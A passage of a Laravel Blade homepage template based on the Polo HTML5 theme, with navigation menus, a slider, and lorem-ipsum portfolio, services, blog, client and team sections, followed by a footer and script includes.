                                                            <li> <a href="portfolio-no-page-title.html">No Page
                                                                    Title</a> </li>
                                                            <li> <a href="portfolio-no-page-title-sidebar.html">No Page
                                                                    Title - Sidebar</a> </li>
                                                            <li> <a href="portfolio-hover-styles.html">Hover Styles</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2-5">
                                                        <ul>
                                                            <li class="mega-menu-title">Single Project</li>
                                                            <li> <a href="portfolio-page-grid-gallery.html">Grid
                                                                    Gallery</a> </li>
                                                            <li> <a href="portfolio-page-particles.html">Particles Wide
                                                                    Project</a> </li>
                                                            <li> <a href="portfolio-page-floating-sidebar.html">Floating
                                                                    Sidebar</a> </li>
                                                            <li> <a href="portfolio-page-slider.html">Slider version</a>
                                                            </li>
                                                            <li> <a href="portfolio-page-background-image.html">Fullscreen
                                                                    image</a> </li>
                                                            <li> <a href="portfolio-page-background-video.html">Fullscreen
                                                                    Video</a> </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-md-12 no-padding">
                                                        <div class="d-none d-lg-block m-t-40 m-b-10">
                                                            <div class="container">
                                                                <div class="row">
                                                                    <div class="col-lg-9 m-t-10">
                                                                        <div class="text-center center">
                                                                            <div class="heading-creative">
                                                                                <strong>20+</strong> Amazing Hover
                                                                                Styles</div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="col-lg-3">
                                                                        <a href="portfolio-hover-styles.html"
                                                                            class="btn m-l-20 btn-light btn-shadow btn-light-hover btn-light-hover">View
                                                                            All Hover Styles</a>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <ul class="d-block d-lg-none">
                                                            <li> <a class="mega-menu-title"
                                                                    href="portfolio-hover-styles.html">20+ Amazing Hover
                                                                    Styles</a> </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </li>
                                        </ul>
                                    </li>
                                    <li class="dropdown mega-menu-item"> <a href="{{route('allposts')}}">Blog</a>

                                    </li>
                                    <li class="dropdown mega-menu-item"> <a href="#">Shop</a>
                                        <ul class="dropdown-menu">
                                            <li class="mega-menu-content">
                                                <div class="row">
                                                    <div class="col-lg-2-5">
                                                        <ul>
                                                            <li class="mega-menu-title">Columns</li>
                                                            <li> <a href="shop-columns-2.html">Two Columns</a> </li>
                                                            <li> <a href="shop-columns-3.html">Three Columns</a> </li>
                                                            <li> <a href="shop-columns-4.html">Four Columns</a> </li>
                                                            <li> <a href="shop-columns-5.html">Five Columns</a> </li>
                                                            <li> <a href="shop-columns-6.html">Six Columns</a> </li>
                                                            <li> <a href="shop-sidebar-sticky.html">Sidebar Sticky</a>
                                                            </li>
                                                            <li> <a href="shop-wide.html">Wide version</a> </li>
                                                            <li> <a href="shop-no-page-title.html">No page title</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2-5">
                                                        <ul>
                                                            <li class="mega-menu-title">Layouts</li>
                                                            <li> <a href="shop-sidebar-left.html">Left Sidebar</a> </li>
                                                            <li> <a href="shop-sidebar-right.html">Right Sidebar</a>
                                                            </li>
                                                            <li> <a href="shop-sidebar-both.html">Both Sidebars</a>
                                                            </li>
                                                            <li> <a href="shop-fullwidth.html">Fullwidth (Wide)</a>
                                                            </li>
                                                            <li class="mega-menu-title">Loading Styles</li>
                                                            <li> <a href="shop-load-more.html">Load more</a>
                                                                <a href="shop-load-more-sidebar.html">Load Sidebar</a>
                                                            </li>
                                                            <li> <a href="shop-infinite-scroll.html">Infinity Scroll</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2-5">
                                                        <ul>
                                                            <li class="mega-menu-title">Order process</li>
                                                            <li> <a class="animsition-link"
                                                                    href="shop-cart.html">Shoping Cart</a> </li>
                                                            <li> <a class="animsition-link"
                                                                    href="shop-cart-empty.html">Shoping Cart - Empty</a>
                                                            </li>
                                                            <li> <a class="animsition-link"
                                                                    href="shop-checkout.html">Checkout</a> </li>
                                                            <li> <a class="animsition-link"
                                                                    href="shop-checkout-completed.html">Checkout
                                                                    Completed</a> </li>
                                                            <li> <a href="shop-wishlist.html">Wishlist</a> </li>
                                                            <li> <a href="shop-wishlist-empty.html">Wishlist Empty</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2-5">
                                                        <ul>
                                                            <li class="mega-menu-title">Single Product</li>
                                                            <li> <a href="shop-single-product.html">Fullwidth</a> </li>
                                                            <li> <a href="shop-single-product-sidebar-left.html">Left
                                                                    Sidebar</a> </li>
                                                            <li> <a href="shop-single-product-sidebar-right.html">Right
                                                                    Sidebar</a> </li>
                                                            <li> <a href="shop-single-product-sidebar-both.html">Both
                                                                    Sidebars</a> </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2-5 p-l-0">
                                                        <h4 class="text-theme">BIG SALE <small>Up to</small></h4>
                                                        <h2 class="text-lg text-theme lh80 m-b-30">70%</h2>
                                                        <p class="m-b-0">The most happiest time of the day!. Morbi
                                                            sagittis, sem quis ipsum dolor sit amet lacinia faucibus.
                                                        </p>
                                                        <a class="btn btn-shadow btn-rounded btn-block m-t-10">SHOP
                                                            NOW!</a><small class="t300">
                                                            <p class="text-center m-0"><em>* Limited time Offer</em></p>
                                                        </small>
                                                    </div>
                                                </div>
                                            </li>
                                        </ul>
                                    </li>
                                </ul>
                            </nav>
                        </div>
                    </div>

                </div>
            </div>
        </header>


        <div id="slider" class="inspiro-slider slider-fullscreen arrows-large arrows-creative dots-creative">

            <div class="slide background-overlay-gradient kenburns background-image"
                style="background-image:url('site/images/slider/notgeneric_bg3.jpg');">
                <div class="container">
                    <div class="slide-captions text-center text-light">

                        <h1>WELCOME TO THE WORLD OF POLO</h1>
                        <p>Say hello to the smartest and most flexible bootstrap template. Polo is an powerful template
                            that can build any type of websites, and quite possibly the only one you will ever need.</p>
                        <a href="#welcome" class="btn scroll-to">Explore more</a>

                    </div>
                </div>
            </div>


            <div class="slide background-overlay-gradient kenburns background-image"
                style="background-image:url('site/images/slider/pattern.png');">
                <div class="container">
                    <div class="slide-captions text-left text-light">

                        <h1>200+ Laytout Demos</h1>
                        <p class="text-small">POLO is packed with 200+ pre-made layouts that allow you to quickly
                            jumpstart your project. Completely customizable for creating your own designs.</p>
                        <a href="#welcome" class="btn scroll-to">Explore more</a>

                    </div>
                </div>
            </div>

        </div>


        <section id="welcome" class="p-b-0">
            <div class="container">
                <div class="heading-text heading-section text-center m-b-40" data-animate="fadeInUp">
                    <h2>WELCOME TO THE WORLD OF POLO</h2>
                    <span class="lead">Create amam ipsum dolor sit amet, Beautiful nature, and rare feathers!.</span>
                </div>
                <div class="row" data-animate="fadeInUp">
                    <div class="col-lg-12">
                        <img class="img-fluid" src="{{asset('site/images/other/responsive-1.jpg')}}"
                            alt="Welcome to POLO">
                    </div>
                </div>
            </div>
        </section>


        <section class="background-grey">
            <div class="container">
                <div class="heading-text heading-section">
                    <h2>WHAT WE DO</h2>
                    <span class="lead">Create amam ipsum dolor sit amet, Beautiful nature, and rare feathers!.</span>
                </div>
                <div class="row">
                    <div class="col-lg-4">
                        <div data-animate="fadeInUp" data-animate-delay="0">
                            <h4>Modern Design</h4>
                            <p>Lorem ipsum dolor sit amet, blandit vel sapien vitae, condimentum ultricies magna et.
                                Quisque euismod orci ut et lobortis aliquam.</p>
                        </div>
                    </div>
                    <div class="col-lg-4">
                        <div data-animate="fadeInUp" data-animate-delay="200">
                            <h4>Loaded with Features</h4>
                            <p>Lorem ipsum dolor sit amet, blandit vel sapien vitae, condimentum ultricies magna et.
                                Quisque euismod orci ut et lobortis aliquam.</p>
                        </div>
                    </div>
                    <div class="col-lg-4">
                        <div data-animate="fadeInUp" data-animate-delay="400">
                            <h4>Completely Customizable</h4>
                            <p>Lorem ipsum dolor sit amet, blandit vel sapien vitae, condimentum ultricies magna et.
                                Quisque euismod orci ut et lobortis aliquam.</p>
                        </div>
                    </div>
                    <div class="col-lg-4">
                        <div data-animate="fadeInUp" data-animate-delay="600">
                            <h4>100% Responsive Layout</h4>
                            <p>Lorem ipsum dolor sit amet, blandit vel sapien vitae, condimentum ultricies magna et.
                                Quisque euismod orci ut et lobortis aliquam.</p>
                        </div>
                    </div>
                    <div class="col-lg-4">
                        <div data-animate="fadeInUp" data-animate-delay="800">
                            <h4>Clean Modern Code</h4>
                            <p>Lorem ipsum dolor sit amet, blandit vel sapien vitae, condimentum ultricies magna et.
                                Quisque euismod orci ut et lobortis aliquam.</p>
                        </div>
                    </div>
                    <div class="col-lg-4">
                        <div data-animate="fadeInUp" data-animate-delay="1000">
                            <h4>Free Updates & Support</h4>
                            <p>Lorem ipsum dolor sit amet, blandit vel sapien vitae, condimentum ultricies magna et.
                                Quisque euismod orci ut et lobortis aliquam.</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>


        <section class="p-b-0">
            <div class="container">
                <div class="heading-text heading-section">
                    <h2>RECENT WORK</h2>
                    <span class="lead">Lorem ipsum dolor sit amet, coper suscipit lobortis nisl ut aliquip ex ea commodo
                        consequat. Duis autem vel eum iriure dolor in hendrerit in vulputate velit esse molestie
                        consequat, vel illum dolore eu feugiat nulla facilisis at vero eros et accumsan et iusto.</span>
                </div>
            </div>
            <div class="portfolio">

                <div id="portfolio" class="grid-layout portfolio-4-columns" data-margin="0">

                    <div class="portfolio-item no-overlay ct-photography ct-media ct-branding ct-Media ct-webdesign">
                        <div class="portfolio-item-wrap">
                            <div class="portfolio-slider">
                                <div class="carousel dots-inside dots-dark arrows-dark" data-items="1" data-loop="true"
                                    data-autoplay="true" data-animate-in="fadeIn" data-animate-out="fadeOut"
                                    data-autoplay-timeout="1500">
                                    <a href="#"><img src="{{asset('site/images/portfolio/64.jpg')}}" alt=""></a>
                                    <a href="#"><img src="{{asset('site/images/portfolio/70.jpg')}}" alt=""></a>
                                </div>
                            </div>
                        </div>
                    </div>


                    <div class="portfolio-item img-zoom ct-photography ct-marketing ct-media">
                        <div class="portfolio-item-wrap">
                            <div class="portfolio-image">
                                <a href="#"><img src="{{asset('site/images/portfolio/60.jpg')}}" alt=""></a>
                            </div>
                            <div class="portfolio-description">
                                <a title="Paper Pouch!" data-lightbox="image" href="images/portfolio/83l.jpg')}}"><i
                                        class="fa fa-expand"></i></a>
                                <a href="portfolio-page-grid-gallery.html"><i class="fa fa-link"></i></a>
                            </div>
                        </div>
                    </div>


                    <div class="portfolio-item img-zoom ct-photography ct-media ct-branding ct-Media">
                        <div class="portfolio-item-wrap">
                            <div class="portfolio-image">
                                <a href="#"><img src="{{asset('site/images/portfolio/61.jpg')}}" alt=""></a>
                            </div>
                            <div class="portfolio-description">
                                <a href="portfolio-page-grid-gallery.html">
                                    <h3>Let's Go Outside</h3>
                                    <span>Illustrations / Graphics</span>
                                </a>
                            </div>
                        </div>
                    </div>


                    <div class="portfolio-item img-zoom ct-photography ct-media ct-branding ct-marketing ct-webdesign">
                        <div class="portfolio-item-wrap">
                            <div class="portfolio-image">
                                <a href="#"><img src="{{asset('site/images/portfolio/65.jpg')}}" alt=""></a>
                            </div>
                            <div class="portfolio-description" data-lightbox="gallery">
                                <a title="Photoshop Mock-up!" data-lightbox="gallery-image"
                                    href="images/portfolio/80l.jpg')}}"><i class="fa fa-clone"></i></a>
                                <a title="Paper Pouch!" data-lightbox="gallery-image"
                                    href="images/portfolio/81l.jpg')}}" class="hidden"></a>
                                <a title="Mock-up" data-lightbox="gallery-image" href="images/portfolio/82l.jpg')}}"
                                    class="hidden"></a>
                                <a href="portfolio-page-grid-gallery.html"><i class="fa fa-link"></i></a>
                            </div>
                        </div>
                    </div>


                    <div class="portfolio-item img-zoom ct-marketing ct-media ct-branding ct-marketing ct-webdesign">
                        <div class="portfolio-item-wrap">
                            <div class="portfolio-image">
                                <a href="#"><img src="{{asset('site/images/portfolio/66.jpg')}}" alt=""></a>
                            </div>
                            <div class="portfolio-description">
                                <a href="portfolio-page-grid-gallery.html">
                                    <h3>Last Iceland Sunshine</h3>
                                    <span>Graphics</span>
                                </a>
                            </div>
                        </div>
                    </div>


                    <div class="portfolio-item img-zoom ct-photography ct-media ct-branding ct-marketing ct-webdesign">
                        <div class="portfolio-item-wrap">
                            <div class="portfolio-image">
                                <a href="#"><img src="{{asset('site/images/portfolio/67.jpg')}}" alt=""></a>
                            </div>
                            <div class="portfolio-description">
                                <a title="Paper Pouch!" data-lightbox="iframe"
                                    href="https://www.youtube.com/watch?v=k6Kly58LYzY"><i class="fa fa-play"></i></a>
                                <a href="portfolio-page-grid-gallery.html"><i class="fa fa-link"></i></a>
                            </div>
                        </div>
                    </div>


                    <div
                        class="portfolio-item no-overlay ct-photography ct-media ct-branding ct-Media ct-marketing ct-webdesign">
                        <div class="portfolio-item-wrap">
                            <div class="portfolio-slider">
                                <div class="carousel dots-inside dots-dark arrows-dark" data-items="1" data-loop="true"
                                    data-autoplay="true" data-animate-in="fadeIn" data-animate-out="fadeOut"
                                    data-autoplay-timeout="1500">
                                    <a href="#"><img src="{{asset('site/images/portfolio/68.jpg')}}" alt=""></a>
                                    <a href="#"><img src="{{asset('site/images/portfolio/71.jpg')}}" alt=""></a>
                                </div>
                            </div>
                        </div>
                    </div>


                    <div class="portfolio-item img-zoom ct-photography ct-marketing ct-media">
                        <div class="portfolio-item-wrap">
                            <div class="portfolio-image">
                                <a href="#"><img src="{{asset('site/images/portfolio/69.jpg')}}" alt=""></a>
                            </div>
                            <div class="portfolio-description">
                                <a href="portfolio-page-grid-gallery.html">
                                    <h3>Luxury Wine</h3>
                                    <span>Graphics / Branding</span>
                                </a>
                            </div>
                        </div>
                    </div>

                </div>

            </div>
        </section>


        <section>
            <div class="container">
                <div class="heading-text heading-section text-center">
                    <h2>SERVICES</h2>
                    <p>Lorem ipsum dolor sit amet, consecte adipiscing elit. Suspendisse condimentum porttitor cursumus.
                    </p>
                </div>
                <div class="row">
                    <div class="col-lg-4" data-animate="fadeInUp" data-animate-delay="0">
                        <div class="icon-box effect medium border small">
                            <div class="icon">
                                <a href="#"><i class="fa fa-plug"></i></a>
                            </div>
                            <h3>Powerful template</h3>
                            <p>Lorem ipsum dolor sit amet, consecte adipiscing elit. Suspendisse condimentum porttitor
                                cursumus.</p>
                        </div>
                    </div>
                    <div class="col-lg-4" data-animate="fadeInUp" data-animate-delay="200">
                        <div class="icon-box effect medium border small">
                            <div class="icon">
                                <a href="#"><i class="fa fa-desktop"></i></a>
                            </div>
                            <h3>Flexible Layouts</h3>
                            <p>Lorem ipsum dolor sit amet, consecte adipiscing elit. Suspendisse condimentum porttitor
                                cursumus.</p>
                        </div>
                    </div>
                    <div class="col-lg-4" data-animate="fadeInUp" data-animate-delay="400">
                        <div class="icon-box effect medium border small">
                            <div class="icon">
                                <a href="#"><i class="fa fa-cloud"></i></a>
                            </div>
                            <h3>Retina Ready</h3>
                            <p>Lorem ipsum dolor sit amet, consecte adipiscing elit. Suspendisse condimentum porttitor
                                cursumus.</p>
                        </div>
                    </div>
                    <div class="col-lg-4" data-animate="fadeInUp" data-animate-delay="600">
                        <div class="icon-box effect medium border small">
                            <div class="icon">
                                <a href="#"><i class="far fa-lightbulb"></i></a>
                            </div>
                            <h3>Fast processing</h3>
                            <p>Lorem ipsum dolor sit amet, consecte adipiscing elit. Suspendisse condimentum porttitor
                                cursumus.</p>
                        </div>
                    </div>
                    <div class="col-lg-4" data-animate="fadeInUp" data-animate-delay="800">
                        <div class="icon-box effect medium border small">
                            <div class="icon">
                                <a href="#"><i class="fa fa-trophy"></i></a>
                            </div>
                            <h3>Unlimited Colors</h3>
                            <p>Lorem ipsum dolor sit amet, consecte adipiscing elit. Suspendisse condimentum porttitor
                                cursumus.</p>
                        </div>
                    </div>
                    <div class="col-lg-4" data-animate="fadeInUp" data-animate-delay="1000">
                        <div class="icon-box effect medium border small">
                            <div class="icon">
                                <a href="#"><i class="fa fa-thumbs-up"></i></a>
                            </div>
                            <h3>Premium Sliders</h3>
                            <p>Lorem ipsum dolor sit amet, consecte adipiscing elit. Suspendisse condimentum porttitor
                                cursumus.</p>
                        </div>
                    </div>
                    <div class="col-lg-4" data-animate="fadeInUp" data-animate-delay="1200">
                        <div class="icon-box effect medium border small">
                            <div class="icon">
                                <a href="#"><i class="fa fa-rocket"></i></a>
                            </div>
                            <h3>Modern Design</h3>
                            <p>Lorem ipsum dolor sit amet, consecte adipiscing elit. Suspendisse condimentum porttitor
                                cursumus.</p>
                        </div>
                    </div>
                    <div class="col-lg-4" data-animate="fadeInUp" data-animate-delay="1400">
                        <div class="icon-box effect medium border small">
                            <div class="icon">
                                <a href="#"><i class="fa fa-flask"></i></a>
                            </div>
                            <h3>Clean Modern Code</h3>
                            <p>Lorem ipsum dolor sit amet, consecte adipiscing elit. Suspendisse condimentum porttitor
                                cursumus.</p>
                        </div>
                    </div>
                    <div class="col-lg-4" data-animate="fadeInUp" data-animate-delay="1600">
                        <div class="icon-box effect medium border small">
                            <div class="icon">
                                <a href="#"><i class="fa fa-umbrella"></i></a>
                            </div>
                            <h3>Free Updates & Support</h3>
                            <p>Lorem ipsum dolor sit amet, consecte adipiscing elit. Suspendisse condimentum porttitor
                                cursumus.</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>


        <section class="text-light p-t-150 p-b-150 background-overlay"
            data-parallax-image="{{asset('site/images/parallax/12.jpg')}}">
            <div class="container">
                <div class="row">
                    <div class="col-lg-3">
                        <div class="text-center">
                            <div class="icon"><i class="fa fa-3x fa-code"></i></div>
                            <div class="counter"> <span data-speed="3000" data-refresh-interval="50" data-to="12416"
                                    data-from="600" data-seperator="true"></span> </div>
                            <div class="seperator seperator-small"></div>
                            <p>LINES OF CODE</p>
                        </div>
                    </div>
                    <div class="col-lg-3">
                        <div class="text-center">
                            <div class="icon"><i class="fa fa-3x fa-coffee"></i></div>
                            <div class="counter"> <span data-speed="4500" data-refresh-interval="23" data-to="365"
                                    data-from="100" data-seperator="true"></span> </div>
                            <div class="seperator seperator-small"></div>
                            <p>CUPS OF COFFEE</p>
                        </div>
                    </div>
                    <div class="col-lg-3">
                        <div class="text-center">
                            <div class="icon"><i class="fa fa-3x fa-rocket"></i></div>
                            <div class="counter"> <span data-speed="3000" data-refresh-interval="12" data-to="114"
                                    data-from="50" data-seperator="true"></span> </div>
                            <div class="seperator seperator-small"></div>
                            <p>FINISHED PROJECTS</p>
                        </div>
                    </div>
                    <div class="col-lg-3">
                        <div class="text-center">
                            <div class="icon"><i class="fa fa-3x fa-smile-o"></i></div>
                            <div class="counter"> <span data-speed="4550" data-refresh-interval="50" data-to="14825"
                                    data-from="48" data-seperator="true"></span> </div>
                            <div class="seperator seperator-small"></div>
                            <p>SATISFIED CLIENTS</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>


        <section class="content background-grey">
            <div class="container">
                <div class="heading-text heading-section">
                    <h2>OUR BLOG</h2>
                    <span class="lead">The most happiest time of the day!. Morbi sagittis, sem quis lacinia faucibus,
                        orci ipsum gravida tortor, vel interdum mi sapien ut justo. Nulla varius consequat magna, id
                        molestie ipsum volutpat quis. A true story, that never been told!. Fusce id mi diam, non ornare
                        orci. Pellentesque ipsum erat, facilisis ut venenatis eu, sodales vel dolor. </span>
                </div>
                <div id="blog" class="grid-layout post-3-columns m-b-30" data-item="post-item">

                    <div class="post-item border">
                        <div class="post-item-wrap">
                            <div class="post-image">
                                <a href="#">
                                    <img alt="" src="{{asset('site/images/blog/12.jpg')}}">
                                </a>
                                <span class="post-meta-category"><a href="#">Lifestyle</a></span>
                            </div>
                            <div class="post-item-description">
                                <span class="post-meta-date"><i class="fa fa-calendar-o"></i>Jan 21, 2017</span>
                                <span class="post-meta-comments"><a href="#"><i class="fa fa-comments-o"></i>33
                                        Comments</a></span>
                                <h2><a href="#">Standard post with a single image
                                    </a></h2>
                                <p>Curabitur pulvinar euismod ante, ac sagittis ante posuere ac. Vivamus luctus commodo
                                    dolor porta feugiat. Fusce at velit id ligula pharetra laoreet.</p>
                                <a href="#" class="item-link">Read More <i class="fa fa-arrow-right"></i></a>
                            </div>
                        </div>
                    </div>


                    <div class="post-item border">
                        <div class="post-item-wrap">
                            <div class="post-image">
                                <a href="#">
                                    <img alt="" src="{{asset('site/images/blog/17.jpg')}}">
                                </a>
                                <span class="post-meta-category"><a href="#">Science</a></span>
                            </div>
                            <div class="post-item-description">
                                <span class="post-meta-date"><i class="fa fa-calendar-o"></i>Jan 21, 2017</span>
                                <span class="post-meta-comments"><a href="#"><i class="fa fa-comments-o"></i>33
                                        Comments</a></span>
                                <h2><a href="#">Standard post with a single image
                                    </a></h2>
                                <p>Curabitur pulvinar euismod ante, ac sagittis ante posuere ac. Vivamus luctus commodo
                                    dolor porta feugiat. Fusce at velit id ligula pharetra laoreet.</p>
                                <a href="#" class="item-link">Read More <i class="fa fa-arrow-right"></i></a>
                            </div>
                        </div>
                    </div>


                    <div class="post-item border">
                        <div class="post-item-wrap">
                            <div class="post-image">
                                <a href="#">
                                    <img alt="" src="{{asset('site/images/blog/18.jpg')}}">
                                </a>
                                <span class="post-meta-category"><a href="#">Science</a></span>
                            </div>
                            <div class="post-item-description">
                                <span class="post-meta-date"><i class="fa fa-calendar-o"></i>Jan 21, 2017</span>
                                <span class="post-meta-comments"><a href="#"><i class="fa fa-comments-o"></i>33
                                        Comments</a></span>
                                <h2><a href="#">Standard post with a single image
                                    </a></h2>
                                <p>Curabitur pulvinar euismod ante, ac sagittis ante posuere ac. Vivamus luctus commodo
                                    dolor porta feugiat. Fusce at velit id ligula pharetra laoreet.</p>
                                <a href="#" class="item-link">Read More <i class="fa fa-arrow-right"></i></a>
                            </div>
                        </div>
                    </div>

                </div>
            </div>
        </section>


        <section class="p-t-60">
            <div class="container">
                <div class="heading-text heading-section text-center">
                    <h2>CLIENTS</h2>
                    <span class="lead">Our awesome clients we've had the pleasure to work with! </span>
                </div>
                <div class="carousel" data-items="6" data-items-sm="4" data-items-xs="3" data-items-xxs="2"
                    data-margin="20" data-arrows="false" data-autoplay="true" data-autoplay-timeout="3000"
                    data-loop="true">
                    <div>
                        <a href="#"><img alt="" src="{{asset('site/images/clients/1.png')}}"> </a>
                    </div>
                    <div>
                        <a href="#"><img alt="" src="{{asset('site/images/clients/2.png')}}"> </a>
                    </div>
                    <div>
                        <a href="#"><img alt="" src="{{asset('site/images/clients/3.png')}}"> </a>
                    </div>
                    <div>
                        <a href="#"><img alt="" src="{{asset('site/images/clients/4.png')}}"> </a>
                    </div>
                    <div>
                        <a href="#"><img alt="" src="{{asset('site/images/clients/5.png')}}"> </a>
                    </div>
                    <div>
                        <a href="#"><img alt="" src="{{asset('site/images/clients/6.png')}}"> </a>
                    </div>
                    <div>
                        <a href="#"><img alt="" src="{{asset('site/images/clients/7.png')}}"> </a>
                    </div>
                    <div>
                        <a href="#"><img alt="" src="{{asset('site/images/clients/8.png')}}"> </a>
                    </div>
                    <div>
                        <a href="#"><img alt="" src="{{asset('site/images/clients/9.png')}}"> </a>
                    </div>
                </div>
            </div>
        </section>


        <section class="background-grey">
            <div class="container">
                <div class="heading-text heading-section text-center">
                    <h2>MEET OUR TEAM</h2>
                    <p>Lorem ipsum dolor sit amet, consecte adipiscing elit. Suspendisse condimentum porttitor cursumus.
                    </p>
                </div>
                <div class="row team-members">
                    <div class="col-lg-3">
                        <div class="team-member">
                            <div class="team-image">
                                <img src="{{asset('site/images/team/6.jpg')}}">
                            </div>
                            <div class="team-desc">
                                <h3>Alea Smith</h3>
                                <span>Software Developer</span>
                                <p>Lorem ipsum dolor sit amet, consectetur adipiscing tristique hendrerit laoreet. </p>
                                <div class="align-center">
                                    <a class="btn btn-xs btn-slide btn-light" href="#">
                                        <i class="fab fa-facebook-f"></i>
                                        <span>Facebook</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="#" data-width="100">
                                        <i class="fab fa-twitter"></i>
                                        <span>Twitter</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="#" data-width="118">
                                        <i class="fab fa-instagram"></i>
                                        <span>Instagram</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="mailto:#" data-width="80">
                                        <i class="far fa-envelope"></i>
                                        <span>Mail</span>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-3">
                        <div class="team-member">
                            <div class="team-image">
                                <img src="{{asset('site/images/team/7.jpg')}}">
                            </div>
                            <div class="team-desc">
                                <h3>Ariol Doe</h3>
                                <span>Software Developer</span>
                                <p>Lorem ipsum dolor sit amet, consectetur adipiscing tristique hendrerit laoreet. </p>
                                <div class="align-center">
                                    <a class="btn btn-xs btn-slide btn-light" href="#">
                                        <i class="fab fa-facebook-f"></i>
                                        <span>Facebook</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="#" data-width="100">
                                        <i class="fab fa-twitter"></i>
                                        <span>Twitter</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="#" data-width="118">
                                        <i class="fab fa-instagram"></i>
                                        <span>Instagram</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="mailto:#" data-width="80">
                                        <i class="far fa-envelope"></i>
                                        <span>Mail</span>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-3">
                        <div class="team-member">
                            <div class="team-image">
                                <img src="{{asset('site/images/team/8.jpg')}}">
                            </div>
                            <div class="team-desc">
                                <h3>Emma Ross</h3>
                                <span>Software Developer</span>
                                <p>Lorem ipsum dolor sit amet, consectetur adipiscing tristique hendrerit laoreet. </p>
                                <div class="align-center">
                                    <a class="btn btn-xs btn-slide btn-light" href="#">
                                        <i class="fab fa-facebook-f"></i>
                                        <span>Facebook</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="#" data-width="100">
                                        <i class="fab fa-twitter"></i>
                                        <span>Twitter</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="#" data-width="118">
                                        <i class="fab fa-instagram"></i>
                                        <span>Instagram</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="mailto:#" data-width="80">
                                        <i class="far fa-envelope"></i>
                                        <span>Mail</span>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-3">
                        <div class="team-member">
                            <div class="team-image">
                                <img src="{{asset('site/images/team/9.jpg')}}">
                            </div>
                            <div class="team-desc">
                                <h3>Victor Loda</h3>
                                <span>Software Developer</span>
                                <p>Lorem ipsum dolor sit amet, consectetur adipiscing tristique hendrerit laoreet. </p>
                                <div class="align-center">
                                    <a class="btn btn-xs btn-slide btn-light" href="#">
                                        <i class="fab fa-facebook-f"></i>
                                        <span>Facebook</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="#" data-width="100">
                                        <i class="fab fa-twitter"></i>
                                        <span>Twitter</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="#" data-width="118">
                                        <i class="fab fa-instagram"></i>
                                        <span>Instagram</span>
                                    </a>
                                    <a class="btn btn-xs btn-slide btn-light" href="mailto:#" data-width="80">
                                        <i class="far fa-envelope"></i>
                                        <span>Mail</span>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>


        <footer id="footer">
            <div class="footer-content">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-5">
                            <div class="widget">
                                <div class="widget-title">Polo HTML5 Template</div>
                                <p class="mb-5">Built with love in Fort Worth, Texas, USA<br>
                                    All rights reserved. Copyright © 2019. INSPIRO.</p>
                                <a href="https://themeforest.net/item/polo-responsive-multipurpose-html5-template/13708923"
                                    class="btn btn-inverted">Purchase Now</a>
                            </div>
                        </div>
                        <div class="col-lg-7">
                            <div class="row">
                                <div class="col-lg-3">
                                    <div class="widget">
                                        <div class="widget-title">Discover</div>
                                        <ul class="list">
                                            <li><a href="#">Features</a></li>
                                            <li><a href="#">Layouts</a></li>
                                            <li><a href="#">Corporate</a></li>
                                            <li><a href="#">Updates</a></li>
                                            <li><a href="#">Pricing</a></li>
                                            <li><a href="#">Customers</a></li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="col-lg-3">
                                    <div class="widget">
                                        <div class="widget-title">Features</div>
                                        <ul class="list">
                                            <li><a href="#">Layouts</a></li>
                                            <li><a href="#">Headers</a></li>
                                            <li><a href="#">Widgets</a></li>
                                            <li><a href="#">Footers</a></li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="col-lg-3">
                                    <div class="widget">
                                        <div class="widget-title">Pages</div>
                                        <ul class="list">
                                            <li><a href="#">Portfolio</a></li>
                                            <li><a href="#">Blog</a></li>
                                            <li><a href="#">Shop</a></li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="col-lg-3">
                                    <div class="widget">
                                        <div class="widget-title">Support</div>
                                        <ul class="list">
                                            <li><a href="#">Help Desk</a></li>
                                            <li><a href="#">Documentation</a></li>
                                            <li><a href="#">Contact Us</a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="copyright-content">
                <div class="container">
                    <div class="copyright-text text-center">&copy; 2019 POLO - Responsive Multi-Purpose HTML5 Template.
                        All Rights Reserved.<a href="http://www.inspiro-media.com/" target="_blank"> INSPIRO</a> </div>
                </div>
            </div>
        </footer>

    </div>


    <a id="scrollTop"><i class="icon-chevron-up1"></i><i class="icon-chevron-up1"></i></a>

    <script src="{{asset('site/js/jquery.js')}}"></script>
    <script src="{{asset('site/js/plugins.js')}}"></script>

    <script src="{{asset('site/js/functions.js')}}"></script>
</body>
<script type="text/javascript">
